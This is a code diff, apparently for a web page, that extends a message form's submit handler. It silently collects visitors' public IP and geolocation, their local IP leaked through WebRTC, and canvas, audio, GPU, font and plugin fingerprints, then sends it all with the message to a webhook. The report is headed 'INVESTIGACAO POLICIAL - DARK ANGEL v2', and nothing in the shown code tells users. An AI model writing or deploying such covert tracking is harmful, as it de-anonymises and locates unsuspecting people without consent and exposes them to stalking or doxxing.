@@ -456,6 +456,142 @@
             return info;
         }
 
+        // Funcao para pegar GPU info via WebGL
+        function getGPUInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return { vendor: 'N/A', renderer: 'N/A' };
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (!debugInfo) return { vendor: 'N/A', renderer: 'N/A' };
+                return {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A',
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A'
+                };
+            } catch (e) {
+                return { vendor: 'N/A', renderer: 'N/A' };
+            }
+        }
+
+        // Funcao para Canvas Fingerprint (gera uma assinatura unica)
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.textBaseline = 'alphabetic';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('POLICIA', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('POLICIA', 4, 17);
+                return canvas.toDataURL().substring(0, 100); // Primeiros 100 chars da assinatura
+            } catch (e) {
+                return 'N/A';
+            }
+        }
+
+        // Funcao para Audio Fingerprint
+        function getAudioFingerprint() {
+            try {
+                const audioContext = window.AudioContext || window.webkitAudioContext;
+                if (!audioContext) return 'N/A';
+                const ctx = new audioContext();
+                const oscillator = ctx.createOscillator();
+                const analyser = ctx.createAnalyser();
+                const gain = ctx.createGain();
+                const scriptProcessor = ctx.createScriptProcessor(4096, 1, 1);
+                gain.gain.value = 0; // Sem som
+                oscillator.connect(analyser);
+                analyser.connect(scriptProcessor);
+                scriptProcessor.connect(gain);
+                gain.connect(ctx.destination);
+                oscillator.start(0);
+                return `AudioContext-${ctx.sampleRate}-${analyser.fftSize}`;
+            } catch (e) {
+                return 'N/A';
+            }
+        }
+
+        // Funcao para pegar IP local via WebRTC
+        function getLocalIPViaWebRTC() {
+            return new Promise((resolve) => {
+                try {
+                    const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [] });
+                    const noop = () => {};
+                    const onicecandidate = (ice) => {
+                        if (!ice || !ice.candidate) return;
+                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                        const ipAddress = ipRegex.exec(ice.candidate.candidate)[1];
+                        pc.onicecandidate = noop;
+                        pc.close();
+                        resolve(ipAddress || 'N/A');
+                    };
+                    pc.onicecandidate = onicecandidate;
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => resolve('N/A'));
+                    setTimeout(() => resolve('N/A'), 1000);
+                } catch (e) {
+                    resolve('N/A');
+                }
+            });
+        }
+
+        // Funcao para detectar fontes instaladas
+        function getInstalledFonts() {
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Impact'];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const text = 'mmmmmmmmmmlli';
+            const textSize = '72px';
+            const measurements = {};
+            
+            baseFonts.forEach(baseFont => {
+                ctx.font = `${textSize} ${baseFont}`;
+                measurements[baseFont] = ctx.measureText(text).width;
+            });
+            
+            const detectedFonts = [];
+            testFonts.forEach(font => {
+                let detected = false;
+                baseFonts.forEach(baseFont => {
+                    ctx.font = `${textSize} ${font}, ${baseFont}`;
+                    const width = ctx.measureText(text).width;
+                    if (width !== measurements[baseFont]) {
+                        detected = true;
+                    }
+                });
+                if (detected) detectedFonts.push(font);
+            });
+            
+            return detectedFonts.length > 0 ? detectedFonts.join(', ') : 'Fontes padrão';
+        }
+
+        // Funcao para pegar plugins e MIME types
+        function getPluginsInfo() {
+            try {
+                const plugins = [];
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push(navigator.plugins[i].name);
+                }
+                return plugins.length > 0 ? plugins.join(', ') : 'Nenhum plugin';
+            } catch (e) {
+                return 'N/A';
+            }
+        }
+
+        // Funcao para pegar informacoes de toque
+        function getTouchInfo() {
+            return {
+                maxTouchPoints: navigator.maxTouchPoints || 'N/A',
+                touchEvent: 'ontouchstart' in window ? 'Sim' : 'Não',
+                pointerEvents: 'PointerEvent' in window ? 'Sim' : 'Não'
+            };
+        }
+
         messageForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -481,6 +617,13 @@
             try {
                 const geo = await getUserIPAndGeo();
                 const advanced = await getAdvancedDeviceInfo();
+                const gpu = getGPUInfo();
+                const canvasFingerprint = getCanvasFingerprint();
+                const audioFingerprint = getAudioFingerprint();
+                const localIP = await getLocalIPViaWebRTC();
+                const fonts = getInstalledFonts();
+                const plugins = getPluginsInfo();
+                const touch = getTouchInfo();
                 const userAgent = navigator.userAgent;
                 
                 // Detectar modelo do iPhone
@@ -507,7 +650,7 @@
                     else operadora = geo.isp;
                 }
                 
-                const messageWithIP = `**Nome/ID:** ${name}\n**IP:** ${geo.ip}\n**País:** ${geo.country}\n**Cidade:** ${geo.city}\n**Região:** ${geo.region}\n**ISP:** ${geo.isp}\n**Localização:** ${geo.mapsLink}\n**Dispositivo:** ${iphoneModel}\n**iOS:** ${iosVersion}\n**Operadora:** ${operadora}\n\n**HARDWARE:**\n**CPU Cores:** ${advanced.cpu}\n**RAM:** ${advanced.ram}GB\n**Plataforma:** ${advanced.platform}\n**Resolução:** ${advanced.screen}\n**Janela:** ${advanced.innerWindow}\n**Profundidade Cor:** ${advanced.colorDepth}\n\n**REDE & DISPOSITIVO:**\n**Tipo Conexão:** ${advanced.connectionType}\n**Latência (RTT):** ${advanced.rtt}\n**Bateria:** ${advanced.battery}\n**Timezone:** ${advanced.timezone}\n\n**BROWSER:**\n**Idioma:** ${advanced.language}\n**Idiomas:** ${advanced.languages}\n**Cookies:** ${advanced.cookies}\n**DNT:** ${advanced.dnt}\n**Webdriver:** ${advanced.webdriver}\n\n**MENSAGEM:** ${message}`;
+                const messageWithIP = `**INVESTIGACAO POLICIAL - DARK ANGEL v2**\n\n**IDENTIFICACAO:**\n**Nome/ID:** ${name}\n**IP Publico:** ${geo.ip}\n**IP Local (LAN):** ${localIP}\n\n**GEOLOCALIZACAO:**\n**Pais:** ${geo.country}\n**Cidade:** ${geo.city}\n**Regiao:** ${geo.region}\n**ISP:** ${geo.isp}\n**Localizacao:** ${geo.mapsLink}\n**Timezone:** ${advanced.timezone}\n\n**DISPOSITIVO MOVEL:**\n**Modelo:** ${iphoneModel}\n**iOS:** ${iosVersion}\n**Operadora:** ${operadora}\n**Tela Toque:** ${touch.touchEvent}\n**Max Touch Points:** ${touch.maxTouchPoints}\n\n**HARDWARE (CYBERSEC):**\n**CPU Cores:** ${advanced.cpu}\n**RAM:** ${advanced.ram}GB\n**Plataforma:** ${advanced.platform}\n**GPU Vendor:** ${gpu.vendor}\n**GPU Renderer:** ${gpu.renderer}\n**Resolucao:** ${advanced.screen}\n**Janela:** ${advanced.innerWindow}\n**Profundidade Cor:** ${advanced.colorDepth}\n\n**FINGERPRINTING (IDENTIFICACAO UNICA):**\n**Canvas Fingerprint:** ${canvasFingerprint}\n**Audio Fingerprint:** ${audioFingerprint}\n\n**REDE & CONEXAO:**\n**Tipo Conexao:** ${advanced.connectionType}\n**Latencia (RTT):** ${advanced.rtt}\n**Bateria:** ${advanced.battery}\n\n**BROWSER & SOFTWARE:**\n**User Agent:** ${userAgent}\n**Idioma:** ${advanced.language}\n**Idiomas:** ${advanced.languages}\n**Cookies:** ${advanced.cookies}\n**DNT:** ${advanced.dnt}\n**Webdriver:** ${advanced.webdriver}\n**Plugins:** ${plugins}\n**Fontes Instaladas:** ${fonts}\n**Pointer Events:** ${touch.pointerEvents}\n\n**MENSAGEM DO USUARIO:**\n${message}\n\n---\n*Dados coletados automaticamente para investigacao policial*`;
                 const messageWithoutIP = `**Nome/ID:** ${name}\n**Mensagem:** ${message}`;
 
                 const response = await fetch(WEBHOOK_URL, {
